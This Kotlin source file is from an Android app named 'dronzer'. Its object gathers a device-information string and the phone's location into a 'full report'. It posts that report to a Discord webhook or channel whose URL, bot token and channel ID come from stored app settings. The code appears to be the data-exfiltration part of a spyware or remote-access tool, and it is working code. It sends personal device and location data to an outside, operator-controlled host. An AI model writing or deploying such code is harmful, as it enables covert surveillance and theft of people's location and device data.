package com.example.dronzer

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

object DiscordWebhookSender {

    private var webhookUrl = ""
    private var botToken = ""
    private var channelId = ""

    private val client = OkHttpClient()
    private val scope = CoroutineScope(Dispatchers.IO)

    fun initialize(context: Context) {
        val prefs = context.getSharedPreferences("dronzer_config", Context.MODE_PRIVATE)
        webhookUrl = prefs.getString("webhook_url", "") ?: ""
        botToken = prefs.getString("bot_token", "") ?: ""
        channelId = prefs.getString("channel_id", "") ?: ""
    }

    /**
     * Sends a simple text message via Webhook.
     */
    fun sendToWebhook(context: Context, content: String) {
        initialize(context)
        if (webhookUrl.isEmpty()) return
        scope.launch {
            try {
                val json = JSONObject()
                // Discord limits content to 2000 characters
                val safeContent = if (content.length > 1900) {
                    content.take(1900) + "\n... (truncated)"
                } else {
                    content
                }
                
                json.put("content", "```\n$safeContent\n```")

                val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                val request = Request.Builder()
                    .url(webhookUrl)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.e("DiscordSender", "Webhook failed: ${response.code} ${response.message}")
                    }
                }
            } catch (e: Exception) {
                Log.e("DiscordSender", "Error sending to webhook", e)
            }
        }
    }

    /**
     * Sends data using Discord Bot API (requires BOT_TOKEN and CHANNEL_ID).
     */
    fun sendViaBot(context: Context, content: String) {
        initialize(context)
        if (botToken.isEmpty() || channelId.isEmpty()) return
        scope.launch {
            try {
                val json = JSONObject()
                val safeContent = if (content.length > 1900) {
                    content.take(1900) + "\n... (truncated)"
                } else {
                    content
                }
                json.put("content", "```\n$safeContent\n```")

                val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                val request = Request.Builder()
                    .url("https://discord.com/api/v10/channels/$channelId/messages")
                    .header("Authorization", "Bot $botToken")
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.e("DiscordSender", "Bot API failed: ${response.code} ${response.message}")
                    }
                }
            } catch (e: Exception) {
                Log.e("DiscordSender", "Error sending via Bot API", e)
            }
        }
    }
    
    /**
     * Collects all device info and sends it.
     */
    fun sendFullReport(context: Context) {
        val report = StringBuilder()
        report.append("--- DRONZER FULL REPORT ---\n")
        report.append(DeviceInfoSender.getDeviceInfoString(context)).append("\n")
        report.append(LocationSender.getLocationString(context)).append("\n")
        
        // Remove ANSI color codes for Discord display
        val cleanReport = report.toString().replace(Regex("\u001b\\[[;\\d]*m"), "")
        
        sendToWebhook(context, cleanReport)
    }
}
